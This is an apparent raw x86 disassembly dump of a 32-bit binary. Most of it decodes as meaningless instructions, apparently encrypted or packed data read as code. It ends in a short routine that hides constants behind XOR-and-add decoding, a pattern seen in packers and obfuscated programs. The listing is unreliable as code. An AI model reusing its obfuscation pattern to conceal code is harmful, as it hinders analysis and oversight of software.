  405908:	or     ah,BYTE PTR [eax-0x1f]
  40590b:	fld    QWORD PTR [edi+0x2770c71d]
  405911:	pop    es
  405912:	aaa    
  405913:	jo     0x405901
  405915:	les    edi,FWORD PTR ds:0x22a0b2bd
  40591b:	(bad)  
  40591c:	xchg   edx,eax
  40591d:	ror    BYTE PTR [eax-0x33],0x42
  405921:	mov    ebp,0x661f4b5d
  405926:	rol    dl,cl
  405928:	cmp    BYTE PTR [ebx],cl
  40592a:	sti    
  40592b:	inc    di
  40592d:	mov    eax,ds:0x6ac6639a
  405932:	cli    
  405933:	ins    DWORD PTR es:[edi],dx
  405934:	cmp    al,dl
  405936:	adc    DWORD PTR ds:0xf909596,ecx
  40593c:	(bad)  
  40593d:	lea    eax,[eax+0x1fb60324]
  405943:	sbb    al,0xfc
  405945:	test   al,0x75
  405947:	mov    DWORD PTR [ebx+0x4ea10daa],esi
  40594d:	mov    ah,0xf3
  40594f:	fisubr DWORD PTR ds:0x5553319f
  405955:	pop    ecx
  405956:	push   ebx
  405957:	push   ecx
  405958:	retf   
  405959:	inc    esp
  40595a:	jge    0x40592e
  40595c:	mov    ch,0xc2
  40595e:	push   cs
  40595f:	mov    eax,0x84234b73
  405964:	sbb    ch,BYTE PTR [ecx]
  405966:	loope  0x4058fd
  405968:	out    0x4c,eax
  40596a:	inc    edi
  40596b:	mov    ebx,0x4f3fecc1
  405970:	or     BYTE PTR [ecx],ah
  405972:	mov    esp,0xf732519e
  405977:	lds    eax,FWORD PTR [edx+0x78e23786]
  40597d:	lock xchg esp,eax
  40597f:	js     0x4059a0
  405981:	out    dx,eax
  405982:	xor    al,0x87
  405984:	data16 adc ch,dh
  405987:	into   
  405988:	inc    esp
  405989:	fmul   QWORD PTR [ebp-0x58]
  40598c:	inc    esi
  40598d:	ret    0x3ff3
  405990:	(bad)  
  405992:	loopne 0x405a02
  405994:	and    dl,cl
  405996:	call   0x2baf:0xfd0127d8
  40599d:	rcr    BYTE PTR [ebp+eiz*8+0x4a],cl
  4059a1:	icebp  
  4059a2:	push   ds
  4059a3:	jge    0x405a14
  4059a5:	mov    ds:0x6e55b993,al
  4059aa:	(bad)  
  4059ac:	int    0xc5
  4059ae:	sub    DWORD PTR [eax],esp
  4059b0:	sbb    ecx,edx
  4059b2:	cmovae esi,DWORD PTR [ebp+0x6]
  4059b6:	sub    DWORD PTR [ecx],ebx
  4059b8:	mov    esp,0x706498e6
  4059bd:	rcr    BYTE PTR [eax],1
  4059bf:	les    eax,FWORD PTR [ebp-0x589d2c0e]
  4059c5:	mov    ds:0x85caf8b,eax
  4059ca:	sbb    al,0xee
  4059cc:	addr16 retf 
  4059ce:	mov    eax,0xbfc340a4
  4059d3:	sub    dh,BYTE PTR [esi+0x79cacf87]
  4059d9:	push   ss
  4059da:	stos   DWORD PTR es:[edi],eax
  4059db:	mov    al,0x23
  4059dd:	mov    bl,0x5d
  4059df:	in     eax,dx
  4059e0:	shl    BYTE PTR [ecx-0x36],1
  4059e3:	xlat   BYTE PTR ds:[ebx]
  4059e4:	bnd jge 0x405a04
  4059e7:	push   ds
  4059e8:	mul    DWORD PTR [ecx+0x30]
  4059eb:	push   esp
  4059ec:	cmp    esp,DWORD PTR [edx+esi*8-0x68]
  4059f0:	jne    0x4059aa
  4059f2:	scas   al,BYTE PTR es:[edi]
  4059f3:	xor    DWORD PTR [ebp-0x1c],edi
  4059f6:	pop    ecx
  4059f7:	jo     0x4059d7
  4059f9:	clc    
  4059fa:	sub    dl,bl
  4059fc:	icebp  
  4059fd:	mov    bl,0x94
  4059ff:	mov    dh,0x55
  405a01:	or     DWORD PTR [eax-0x59],edx
  405a04:	in     al,dx
  405a05:	lods   eax,DWORD PTR ds:[esi]
  405a06:	pop    ds
  405a07:	aam    0x16
  405a09:	stc    
  405a0a:	rol    BYTE PTR [ebx+0x61],1
  405a0d:	fwait
  405a0e:	jp     0x4059cc
  405a10:	sti    
  405a11:	inc    ebx
  405a12:	xor    al,0x48
  405a14:	add    ecx,edx
  405a16:	inc    esi
  405a17:	loope  0x405a3d
  405a19:	hlt    
  405a1a:	push   eax
  405a1b:	sbb    al,0xea
  405a1d:	retf   0x86bf
  405a20:	xchg   ecx,eax
  405a21:	sbb    al,0x97
  405a23:	mov    eax,ebp
  405a25:	pusha  
  405a26:	dec    ecx
  405a27:	les    esi,FWORD PTR [edx-0x11956ea1]
  405a2d:	xor    al,0xcd
  405a2f:	jmp    0xa1851145
  405a34:	pop    ebx
  405a35:	mov    ebx,0xb98ffed7
  405a3a:	out    0xfe,eax
  405a3c:	mov    ebx,0xda1dec70
  405a41:	jle    0x405a6b
  405a43:	jmp    0x7eee:0x89ec5c4
  405a4a:	sub    ecx,DWORD PTR ds:0x2ba7372c
  405a50:	pop    ss
  405a51:	aam    0xfb
  405a53:	jo     0x405a60
  405a55:	pop    ds
  405a56:	dec    eax
  405a57:	adc    al,0xa4
  405a59:	pop    esi
  405a5a:	fdivr  DWORD PTR [esi-0x5f82936f]
  405a60:	and    ecx,DWORD PTR [esi+0x6e]
  405a63:	dec    eax
  405a64:	mov    ah,0xf6
  405a66:	mov    ebp,0xe36f6ce6
  405a6b:	out    0xd2,al
  405a6d:	pop    ss
  405a6e:	mov    dh,0x8f
  405a70:	stc    
  405a71:	adc    eax,0xba9d6e04
  405a76:	adc    ebx,ebp
  405a78:	push   edx
  405a79:	(bad)  
  405a7a:	cmp    al,0x4c
  405a7c:	data16 sub ah,BYTE PTR [edi-0x24659578]
  405a83:	fwait
  405a84:	out    dx,al
  405a85:	ins    BYTE PTR es:[edi],dx
  405a86:	add    BYTE PTR [esi-0x3a3439c1],dh
  405a8c:	cmc    
  405a8d:	push   cs
  405a8e:	inc    edx
  405a8f:	or     DWORD PTR [eax+0x23],edx
  405a92:	mov    WORD PTR [ebp+0x2e],?
  405a95:	ins    BYTE PTR es:[edi],dx
  405a96:	pusha  
  405a97:	loopne 0x405a46
  405a99:	mov    bl,0xa3
  405a9b:	add    esp,DWORD PTR [ecx+0x40]
  405a9e:	pminub mm3,QWORD PTR [edx+eiz*1-0x29d5e4d0]
  405aa6:	push   es
  405aa7:	stos   DWORD PTR es:[edi],eax
  405aa8:	mov    BYTE PTR [eax],al
  405aaa:	add    DWORD PTR [edx+0x18],eax
  405aad:	xor    bl,BYTE PTR [edi+0x42]
  405ab0:	ret    
  405ab1:	bound  edi,QWORD PTR [edi-0x68d5925d]
  405ab7:	sti    
  405ab8:	adc    al,0x54
  405aba:	out    0x9,eax
  405abc:	adc    ebp,esp
  405abe:	jmp    0x405a74
  405ac0:	enter  0x89c2,0x32
  405ac4:	add    esp,DWORD PTR ds:0x118c08c4
  405aca:	fsub   QWORD PTR [ecx-0x60ca6a90]
  405ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad1:	enter  0x26a8,0x52
  405ad5:	xor    ch,BYTE PTR [edx+0x4a]
  405ad8:	adc    esp,DWORD PTR [ebp-0x4e]
  405adb:	dec    edi
  405adc:	test   BYTE PTR [edx],bl
  405ade:	(bad)  
  405ae0:	inc    ebp
  405ae1:	mov    edi,0x82df3a88
  405ae6:	xchg   esp,eax
  405ae7:	sbb    dh,BYTE PTR [eax+edx*8-0x7a]
  405aeb:	into   
  405aec:	pop    es
  405aed:	add    DWORD PTR [esi],0x3b0c3fbb
  405af3:	not    DWORD PTR [ecx]
  405af5:	cmp    ebx,DWORD PTR [eax]
  405af7:	jecxz  0x405ac8
  405af9:	jmp    FWORD PTR [edx]
  405afb:	mov    esi,0x907d7df0
  405b00:	std    
  405b01:	in     eax,dx
  405b02:	pusha  
  405b03:	cli    
  405b04:	in     al,0x21
  405b06:	addr16 ret 
  405b08:	cmp    al,dl
  405b0a:	(bad)  
  405b0b:	sbb    eax,0x53a24ccc
  405b10:	sti    
  405b11:	xchg   ebx,eax
  405b12:	mov    al,ds:0xba326b02
  405b17:	push   0xffffffe0
  405b19:	into   
  405b1a:	add    BYTE PTR [ebx],bl
  405b1c:	or     bh,al
  405b1e:	jmp    0x405b67
  405b20:	imul   esi,edx,0xffffffaa
  405b23:	das    
  405b24:	sub    esp,ebx
  405b26:	push   ebx
  405b27:	sbb    ebx,DWORD PTR [edi+0x32]
  405b2a:	retf   
  405b2b:	pop    ds
  405b2c:	pop    DWORD PTR [ebx-0x4e]
  405b2f:	addr16 push edi
  405b31:	sbb    eax,0xd93ad61e
  405b36:	push   es
  405b37:	pusha  
  405b38:	icebp  
  405b39:	push   edx
  405b3a:	mov    cl,0xda
  405b3c:	adc    ebp,DWORD PTR ds:0x87dc32e
  405b42:	and    al,0xd8
  405b44:	cmp    bh,BYTE PTR [ebp+0x35]
  405b47:	inc    ebx
  405b48:	jecxz  0x405b7e
  405b4a:	pop    edi
  405b4b:	inc    ebx
  405b4c:	in     eax,dx
  405b4d:	cwde   
  405b4e:	shl    BYTE PTR [ecx+0x57],cl
  405b51:	or     ebp,DWORD PTR [eax+0x58]
  405b54:	or     DWORD PTR [ebx+ebx*4-0x47],eax
  405b58:	gs dec ecx
  405b5a:	push   0xb5ead7bd
  405b5f:	xchg   esp,eax
  405b60:	rcl    ch,0x55
  405b63:	push   esp
  405b64:	pop    ecx
  405b65:	adc    BYTE PTR [edi],dh
  405b67:	into   
  405b68:	sub    DWORD PTR [esi],esp
  405b6a:	test   al,dh
  405b6c:	and    DWORD PTR [ebx-0x5c],0xf3719bcd
  405b73:	aam    0x41
  405b75:	fs sub eax,0x3895292f
  405b7b:	cmp    bh,bh
  405b7d:	aam    0x9b
  405b7f:	xor    al,0x4a
  405b81:	movntq QWORD PTR ds:0x14375d3d,mm0
  405b88:	xchg   esi,eax
  405b89:	pop    es
  405b8a:	xlat   BYTE PTR ds:[ebx]
  405b8b:	sub    BYTE PTR [esi-0x50bc7fed],al
  405b91:	lds    edi,FWORD PTR [ebp+0x29]
  405b94:	xchg   al,bl
  405b96:	loopne 0x405b67
  405b98:	sbb    BYTE PTR [esi-0x70cf0341],al
  405b9e:	call   0x1afdffbf
  405ba3:	enter  0x850,0x74
  405ba7:	inc    BYTE PTR [eax-0x64]
  405baa:	push   0x891775ab
  405baf:	in     al,0x15
  405bb1:	shl    BYTE PTR [ebx-0x78],1
  405bb4:	mov    esi,0x8e511312
  405bb9:	out    0x42,al
  405bbb:	add    DWORD PTR [esi-0x11],ecx
  405bbe:	mov    eax,ds:0x66579ec6
  405bc3:	cwde   
  405bc4:	(bad)  
  405bc5:	xor    eax,0xe9c763b9
  405bca:	jb     0x405b52
  405bcc:	lahf   
  405bcd:	repnz ss xchg esi,eax
  405bd0:	enter  0x1854,0x9
  405bd4:	push   0xffffffb4
  405bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bd7:	loop   0x405c38
  405bd9:	ds inc esp
  405bdb:	jmp    0x405bcd
  405bdd:	mov    ebx,edx
  405bdf:	fistp  DWORD PTR [edi+ecx*1+0x4cd223cc]
  405be6:	push   ss
  405be7:	dec    ecx
  405be8:	lds    eax,FWORD PTR [esi-0x1b206f38]
  405bee:	aam    0xe5
  405bf0:	loopne 0x405bee
  405bf2:	mov    dh,0x34
  405bf4:	inc    esp
  405bf5:	mov    ebx,0xfe48368
  405bfa:	leave  
  405bfb:	gs xchg esp,eax
  405bfd:	mov    esi,0x5016cdf3
  405c02:	cmp    eax,DWORD PTR [ebx-0x35]
  405c05:	inc    BYTE PTR [eax+0x76]
  405c08:	sub    edi,DWORD PTR [eax-0x322ff14f]
  405c0e:	mov    eax,0xbca1a5e7
  405c13:	jle    0x405c38
  405c15:	mov    esp,0xdd305ece
  405c1a:	sbb    ebx,DWORD PTR [ebx]
  405c1c:	sbb    al,0x78
  405c1e:	add    DWORD PTR [ebp-0x1d42ec48],0xad68367f
  405c28:	dec    ebx
  405c29:	lods   al,BYTE PTR ds:[esi]
  405c2a:	out    dx,eax
  405c2b:	test   eax,0x5ff43ecd
  405c30:	push   ecx
  405c31:	xor    al,0x6e
  405c33:	pushf  
  405c34:	dec    eax
  405c35:	and    DWORD PTR [edi-0x2a],0x1ff558da
  405c3c:	xlat   BYTE PTR ds:[ebx]
  405c3d:	xchg   ecx,eax
  405c3e:	daa    
  405c3f:	cdq    
  405c40:	pop    edx
  405c41:	jle    0x405bf2
  405c43:	into   
  405c44:	pop    edx
  405c45:	jge    0x405c8e
  405c47:	out    dx,eax
  405c48:	in     eax,dx
  405c49:	inc    edx
  405c4a:	add    esp,DWORD PTR [edi]
  405c4c:	(bad)  
  405c4d:	ja     0x405caa
  405c4f:	sub    al,0x7d
  405c51:	mov    bl,0xff
  405c53:	je     0x405c37
  405c55:	cs mov ecx,0xfd0bb3ef
  405c5b:	mov    dl,0xb9
  405c5d:	gs xor eax,0x27aeb2c2
  405c63:	push   ss
  405c64:	lahf   
  405c65:	nop
  405c66:	push   eax
  405c67:	push   0x42
  405c69:	in     al,dx
  405c6a:	inc    ebx
  405c6b:	scas   al,BYTE PTR es:[edi]
  405c6c:	inc    edi
  405c6d:	push   edi
  405c6e:	out    dx,al
  405c6f:	jns    0x405c24
  405c71:	jbe    0x405c9f
  405c73:	leavew 
  405c75:	les    esp,FWORD PTR [ebx]
  405c77:	cmp    al,0x6a
  405c79:	das    
  405c7a:	jl     0x405c6f
  405c7c:	lea    ebx,ds:0xecc655b4
  405c82:	push   ebp
  405c83:	stos   BYTE PTR es:[edi],al
  405c84:	or     ebx,eax
  405c86:	and    bl,BYTE PTR [edi-0x21]
  405c89:	adc    eax,0x5d1de89e
  405c8e:	ror    DWORD PTR [eax-0x3d],0x47
  405c92:	jmp    0x14515dfa
  405c97:	dec    esi
  405c98:	xchg   edx,eax
  405c99:	push   0xb2257fe1
  405c9e:	jmp    0xd867467
  405ca3:	pop    esi
  405ca4:	xchg   DWORD PTR [edi-0x473b2aea],edi
  405caa:	mov    ebx,0x1a6cb66d
  405caf:	add    DWORD PTR [eax+0x7abb9b71],0x1c8b7ae7
  405cb9:	lods   eax,DWORD PTR ds:[esi]
  405cba:	in     eax,0x12
  405cbc:	xchg   esp,eax
  405cbd:	hlt    
  405cbe:	pop    ebx
  405cbf:	adc    eax,0xe808e3cc
  405cc4:	cmp    BYTE PTR [ebx-0x5d],cl
  405cc7:	(bad)  
  405cc8:	cwde   
  405cc9:	xor    ah,bh
  405ccb:	jnp    0x405c8f
  405ccd:	jge    0x405d11
  405ccf:	cmp    DWORD PTR [eax+0x2a8458ef],ebp
  405cd5:	fnstsw WORD PTR [ebp-0x62]
  405cd8:	xchg   ah,dl
  405cda:	bound  ebp,QWORD PTR [eax+0x77]
  405cdd:	xchg   esi,eax
  405cde:	shl    DWORD PTR [esi-0x49],1
  405ce1:	fwait
  405ce2:	xchg   ebx,eax
  405ce3:	xor    al,dl
  405ce5:	cdq    
  405ce6:	mov    ds:0xe148631b,eax
  405ceb:	fist   WORD PTR [esi-0x76028ad0]
  405cf1:	dec    ecx
  405cf2:	or     ecx,edx
  405cf4:	jp     0x405ccf
  405cf6:	clc    
  405cf7:	pop    edi
  405cf8:	xchg   edx,eax
  405cf9:	out    0x11,al
  405cfb:	fistp  WORD PTR [ebx]
  405cfd:	outs   dx,DWORD PTR ds:[esi]
  405cfe:	test   BYTE PTR [edi-0x5cce322e],dh
  405d04:	ret    0x7309
  405d07:	xchg   BYTE PTR [eax],dh
  405d09:	daa    
  405d0a:	add    ebp,esp
  405d0c:	jmp    0x4722:0xde74a5ca
  405d13:	cmp    dl,BYTE PTR [ecx]
  405d15:	or     BYTE PTR [ebx+0x2b],cl
  405d18:	in     eax,0x57
  405d1a:	cld    
  405d1b:	shl    DWORD PTR [ecx+0x50],cl
  405d1e:	jns    0x405cbc
  405d20:	mov    dh,0xb7
  405d22:	int3   
  405d23:	jmp    0x6488:0xff7ea880
  405d2a:	cdq    
  405d2b:	lock ds loope 0x405d1a
  405d2f:	std    
  405d30:	jno    0x405ce4
  405d32:	lods   al,BYTE PTR ds:[esi]
  405d33:	mov    ecx,0xe1bc5edf
  405d38:	pusha  
  405d39:	lods   al,BYTE PTR ds:[esi]
  405d3a:	jg     0x405dac
  405d3c:	sbb    BYTE PTR [ebp-0x1e],dl
  405d3f:	ja     0x405d1e
  405d41:	pop    es
  405d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d43:	loop   0x405cec
  405d45:	push   0xfffffff6
  405d47:	pop    ebp
  405d48:	jl     0x405cf4
  405d4a:	pop    es
  405d4b:	jmp    0xf4f1:0x4fafccd2
  405d52:	je     0x405dbf
  405d54:	mov    edi,0x3b787f52
  405d59:	or     eax,0x336cbfce
  405d5e:	pushf  
  405d5f:	ret    0x733c
  405d62:	pop    ds
  405d63:	fist   WORD PTR [eax-0x2]
  405d66:	inc    edi
  405d67:	adc    esp,DWORD PTR ds:0x1a524200
  405d6d:	or     dh,BYTE PTR [esi+0x21fd14c6]
  405d73:	xchg   edi,eax
  405d74:	mov    esi,0x5d413c05
  405d79:	imul   esp,DWORD PTR [eax],0x98556b30
  405d7f:	adc    ebp,DWORD PTR [edx]
  405d81:	inc    ebp
  405d82:	push   edi
  405d83:	scas   al,BYTE PTR es:[edi]
  405d84:	pop    esi
  405d85:	in     eax,0xd8
  405d87:	or     dh,BYTE PTR [ecx]
  405d89:	js     0x405d85
  405d8b:	jb     0x405e05
  405d8d:	push   ebx
  405d8e:	push   es
  405d8f:	xchg   edx,eax
  405d90:	out    dx,al
  405d91:	pop    ecx
  405d92:	inc    esp
  405d93:	les    edi,FWORD PTR [ebx+0xfeacec8]
  405d99:	jnp    0x405d88
  405d9b:	imul   esp,DWORD PTR [esi-0x1d],0x61e42ea8
  405da2:	jne    0x405d99
  405da4:	jnp    0x405da9
  405da6:	std    
  405da7:	rol    BYTE PTR [ebp+0x21407f39],0x8f
  405dae:	mov    edi,0xb8aa411d
  405db3:	shl    DWORD PTR [edi+0x13],1
  405db6:	rcl    DWORD PTR [eax],0x9e
  405db9:	scas   al,BYTE PTR es:[edi]
  405dba:	sbb    dh,BYTE PTR [esi]
  405dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dbd:	and    BYTE PTR [esi+0x205ab6f9],bh
  405dc3:	mov    dl,0x9b
  405dc5:	popf   
  405dc6:	sub    ah,BYTE PTR [esi+0x1c7b8070]
  405dcc:	xor    ch,BYTE PTR [eax+0x6a]
  405dcf:	mov    fs,WORD PTR [eax]
  405dd1:	add    DWORD PTR [ecx+0x2c],eax
  405dd4:	pop    edx
  405dd5:	xor    eax,0xf68cec45
  405dda:	adc    BYTE PTR [eax+0x577c1d5e],0x69
  405de1:	pop    eax
  405de2:	sbb    eax,0xa60548f8
  405de7:	(bad)  
  405de8:	jb     0x405e4d
  405dea:	fild   DWORD PTR [eax-0x5b6f53ab]
  405df0:	iret   
  405df1:	rol    DWORD PTR [ebx+ebp*4+0x3a11f27],1
  405df8:	scas   eax,DWORD PTR es:[edi]
  405df9:	and    ah,cl
  405dfb:	(bad)  
  405dfc:	bound  ebx,QWORD PTR [esi-0xe]
  405dff:	cld    
  405e00:	popf   
  405e01:	lahf   
  405e02:	and    ch,BYTE PTR fs:[ecx+0x47740e26]
  405e09:	or     eax,0xbbc2405f
  405e0e:	int3   
  405e0f:	xchg   esi,eax
  405e10:	fidivr WORD PTR [ecx]
  405e12:	in     al,0x67
  405e14:	loope  0x405e67
  405e16:	dec    ecx
  405e17:	jge    0x405dda
  405e19:	jg     0x405e7f
  405e1b:	jnp    0x405e5d
  405e1d:	(bad)  
  405e1e:	call   0x53ec:0xf61e41b5
  405e25:	sub    DWORD PTR [ebx],ecx
  405e27:	jle    0x405e33
  405e29:	ror    edx,1
  405e2b:	dec    ecx
  405e2c:	test   eax,0x8a82310e
  405e31:	jp     0x405e3e
  405e33:	inc    edi
  405e34:	xor    eax,0xad4583d
  405e39:	stc    
  405e3a:	xchg   edi,eax
  405e3b:	jo     0x405df5
  405e3d:	pop    edx
  405e3e:	pop    ecx
  405e3f:	pushf  
  405e40:	in     eax,0x1c
  405e42:	xor    al,0xfc
  405e44:	xor    edi,eax
  405e46:	dec    ecx
  405e47:	add    ecx,DWORD PTR [ebp+0x32]
  405e4a:	gs inc ebp
  405e4c:	or     ebx,DWORD PTR [ebp-0xca71cc6]
  405e52:	in     al,0x4d
  405e54:	or     ebx,edx
  405e56:	push   es
  405e57:	mov    BYTE PTR [eax],0xe
  405e5a:	or     al,0x60
  405e5c:	test   eax,0x9be28522
  405e61:	mov    fs,WORD PTR [edi+edx*1-0x3ede2bf5]
  405e68:	push   ebp
  405e69:	rcr    BYTE PTR [edi-0x78],1
  405e6c:	imul   ebx,DWORD PTR [edi-0x3f],0xffffffcb
  405e70:	inc    ebx
  405e71:	pop    eax
  405e72:	test   al,0x86
  405e74:	sbb    dl,bl
  405e76:	xchg   BYTE PTR [edx],ch
  405e78:	aam    0x77
  405e7a:	jb     0x405e39
  405e7c:	sbb    al,0x6f
  405e7e:	sub    edi,esi
  405e80:	sub    al,0xad
  405e82:	aam    0x8e
  405e84:	(bad)  
  405e85:	cmp    BYTE PTR [edx],bh
  405e87:	in     eax,0x6
  405e89:	and    edx,DWORD PTR [esi]
  405e8b:	(bad)  
  405e8c:	hlt    
  405e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e8e:	sub    DWORD PTR [edi+0x2a],0xe394cf5b
  405e95:	push   es
  405e96:	loop   0x405ef0
  405e98:	inc    edx
  405e99:	out    dx,al
  405e9a:	leave  
  405e9b:	nop
  405e9c:	mov    esi,DWORD PTR [ecx]
  405e9e:	cmp    eax,0x312a5f2
  405ea3:	out    dx,al
  405ea4:	push   es
  405ea5:	sbb    BYTE PTR [edx],0x91
  405ea8:	stc    
  405ea9:	mov    ebx,0x72b8f35e
  405eae:	stos   DWORD PTR es:[edi],eax
  405eaf:	fcomp  DWORD PTR [edx]
  405eb1:	cmp    DWORD PTR [edi-0x7a],edx
  405eb4:	dec    ebx
  405eb5:	xchg   edi,eax
  405eb6:	xchg   BYTE PTR [ebx-0x25],dh
  405eb9:	jge    0x405ec8
  405ebb:	mov    bl,al
  405ebd:	out    dx,eax
  405ebe:	adc    al,0xbd
  405ec0:	test   DWORD PTR [ecx],eax
  405ec2:	popa   
  405ec3:	repnz and eax,0xa4724b24
  405ec9:	inc    esi
  405eca:	fwait
  405ecb:	sbb    edi,DWORD PTR [ebx-0x2835b550]
  405ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ed2:	inc    ebx
  405ed3:	xor    eax,0xa29c9235
  405ed8:	dec    ebx
  405ed9:	out    0xd3,eax
  405edb:	fadd   QWORD PTR [edi-0x7a]
  405ede:	fld    QWORD PTR [edi]
  405ee0:	xchg   dl,dl
  405ee2:	jp     0x405f4e
  405ee4:	aas    
  405ee5:	(bad)  
  405ee6:	out    0x3,eax
  405ee8:	mov    eax,0x16548a92
  405eed:	mov    BYTE PTR [ebx],al
  405eef:	stos   BYTE PTR es:[edi],al
  405ef0:	imul   esi,DWORD PTR [ebp+0x3f4dfa09],0x4e
  405ef7:	xchg   ebp,eax
  405ef8:	push   0x6d
  405efa:	cmp    DWORD PTR [ecx],ecx
  405efc:	pop    ecx
  405efd:	jnp    0x405ea2
  405eff:	es sub eax,0xe75b4e2b
  405f05:	(bad)  
  405f07:	mov    ecx,DWORD PTR [edi]
  405f09:	cmp    al,0xf1
  405f0b:	jae    0x405eb2
  405f0d:	pop    esi
  405f0e:	jns    0x405f10
  405f10:	xor    eax,DWORD PTR [ecx+0x32821af0]
  405f16:	and    ecx,ebp
  405f18:	std    
  405f19:	cmp    al,0x8a
  405f1b:	mov    ch,0xb1
  405f1d:	push   es
  405f1e:	stos   BYTE PTR es:[edi],al
  405f1f:	test   edi,ecx
  405f21:	pop    eax
  405f22:	sbb    BYTE PTR [ebp+ebx*4+0x75c83977],bh
  405f29:	add    bh,cl
  405f2b:	lea    ebp,[esi+0x2d]
  405f2e:	mov    al,0xda
  405f30:	popa   
  405f31:	xlat   BYTE PTR ds:[ebx]
  405f32:	test   eax,0xae2197c0
  405f37:	ins    DWORD PTR es:[edi],dx
  405f38:	sbb    dl,dh
  405f3a:	pushf  
  405f3b:	mov    WORD PTR [ecx],?
  405f3d:	cdq    
  405f3e:	dec    eax
  405f3f:	fsubrp st(1),st
  405f41:	jecxz  0x405fa8
  405f43:	xor    eax,0xd9b92fde
  405f48:	cdq    
  405f49:	dec    ecx
  405f4a:	arpl   WORD PTR [ecx],ax
  405f4c:	repnz add al,BYTE PTR [edx+0x270a43c6]
  405f53:	mov    BYTE PTR [edi],dh
  405f55:	mov    edx,0xfcfd21ea
  405f5a:	jle    0x405fbb
  405f5c:	xchg   BYTE PTR [edx+0x4d],bh
  405f5f:	(bad)  
  405f61:	outs   dx,DWORD PTR ds:[esi]
  405f62:	jl     0x405f0c
  405f64:	dec    ebx
  405f65:	mov    WORD PTR [ecx-0x2bb731cd],?
  405f6b:	(bad)  
  405f6c:	pop    ecx
  405f6d:	mov    ecx,0x14ec4d0b
  405f72:	cmp    eax,DWORD PTR [esi+0x3b6dea05]
  405f78:	xor    dl,BYTE PTR [edx]
  405f7a:	jmp    0x405f3d
  405f7c:	cmp    BYTE PTR [ebp+0x64],bl
  405f7f:	mov    edi,DWORD PTR [esi]
  405f81:	stos   DWORD PTR es:[edi],eax
  405f82:	dec    edi
  405f83:	stc    
  405f84:	fcomp  QWORD PTR [edx]
  405f86:	inc    eax
  405f87:	mov    ah,0x5f
  405f89:	mov    ch,0x94
  405f8b:	call   0x5c75:0x79b2bdc8
  405f92:	arpl   WORD PTR [ecx-0x39],ax
  405f95:	imul   ecx,DWORD PTR [eax],0xddd298af
  405f9b:	or     eax,0x36bfa6ad
  405fa0:	ins    DWORD PTR es:[edi],dx
  405fa1:	fsub   st,st(4)
  405fa3:	jp     0x405f56
  405fa5:	push   0x3abfd110
  405faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fab:	xor    BYTE PTR [edi-0x4320ea2c],dh
  405fb1:	ss push esi
  405fb3:	lods   al,BYTE PTR ds:[esi]
  405fb4:	or     DWORD PTR [esi-0x10],0x216a5671
  405fbb:	and    BYTE PTR [esi],ah
  405fbd:	(bad)  
  405fbe:	or     BYTE PTR [eax],dh
  405fc0:	cli    
  405fc1:	sar    BYTE PTR [edx+0x50],0x56
  405fc5:	test   eax,0x359779e0
  405fca:	test   dh,dh
  405fcc:	inc    ecx
  405fcd:	pop    esp
  405fce:	jb     0x40601d
  405fd0:	ins    DWORD PTR es:[edi],dx
  405fd1:	inc    edi
  405fd2:	loop   0x405f56
  405fd4:	push   cs
  405fd5:	mov    edi,0x2ab64809
  405fda:	mov    edx,0x489b8fe
  405fdf:	dec    edx
  405fe0:	in     al,0xb9
  405fe2:	dec    ebp
  405fe3:	in     eax,0x40
  405fe5:	push   esi
  405fe6:	test   eax,0x62505428
  405feb:	pop    es
  405fec:	shr    BYTE PTR [esi],cl
  405fee:	jge    0x405fc6
  405ff0:	jecxz  0x40605a
  405ff2:	pop    edx
  405ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ff4:	push   0xffffff84
  405ff6:	fwait
  405ff7:	icebp  
  405ff8:	add    bl,BYTE PTR [esi]
  405ffa:	icebp  
  405ffb:	aam    0x55
  405ffd:	cs mov bh,0x4
  406000:	xor    ebx,edi
  406002:	cdq    
  406003:	or     DWORD PTR [eax+edi*2+0x7f],esp
  406007:	inc    edx
  406008:	sub    dh,bl
  40600a:	mov    ebx,0x645ed134
  40600f:	stc    
  406010:	or     cl,al
  406012:	or     al,0x9
  406014:	dec    esi
  406015:	sbb    edi,DWORD PTR [eax+0x4c]
  406018:	scas   al,BYTE PTR es:[edi]
  406019:	loope  0x406025
  40601b:	mov    ebx,0xb68d3d41
  406020:	pop    ss
  406021:	xchg   BYTE PTR [ecx+0x2b],bl
  406024:	int    0xe6
  406026:	mov    ebx,0x5abdf3f3
  40602b:	stos   DWORD PTR es:[edi],eax
  40602c:	stc    
  40602d:	(bad)  
  40602e:	shr    BYTE PTR [esi+0x8],0xdd
  406032:	and    BYTE PTR ds:0x20a54b62,bh
  406038:	ret    
  406039:	xor    eax,esi
  40603b:	add    eax,edi
  40603d:	cmp    edx,eax
  40603f:	je     0x408557
  406045:	mov    eax,DWORD PTR [ebp-0x8]
  406048:	mov    DWORD PTR [ebp-0x18],eax
  40604b:	mov    eax,DWORD PTR [ebp-0x10]
  40604e:	add    eax,DWORD PTR [ebp-0x54]
  406051:	mov    DWORD PTR [ebp-0x1c],0xf89c85a1
  406058:	mov    DWORD PTR [ebp-0x8],eax
  40605b:	mov    eax,0xf89c85a2
  406060:	mov    DWORD PTR [ebp-0x28],eax
  406063:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  40606a:	mov    DWORD PTR [ebp-0x40],0xf89c85bc
  406071:	mov    DWORD PTR [ebp-0x30],eax
  406074:	mov    eax,DWORD PTR [ebp-0x1c]
  406077:	xor    eax,esi
  406079:	add    eax,edi
  40607b:	jmp    0x408513
  406080:	mov    DWORD PTR [ebp-0x4c],0xf89c85b4
  406087:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  40608e:	mov    eax,DWORD PTR [ebp-0x30]
  406091:	mov    edx,DWORD PTR [ebp-0xc]
  406094:	xor    eax,esi
  406096:	add    eax,edi
  406098:	imul   eax,edx
  40609b:	mov    edx,DWORD PTR [ebp-0x8]
  40609e:	mov    al,BYTE PTR [eax+edx*1]
  4060a1:	mov    BYTE PTR [ebp-0x1],al
  4060a4:	mov    eax,DWORD PTR [ebp-0x30]
  4060a7:	mov    edx,DWORD PTR [ebp-0xc]
  4060aa:	xor    eax,esi
  4060ac:	add    eax,edi
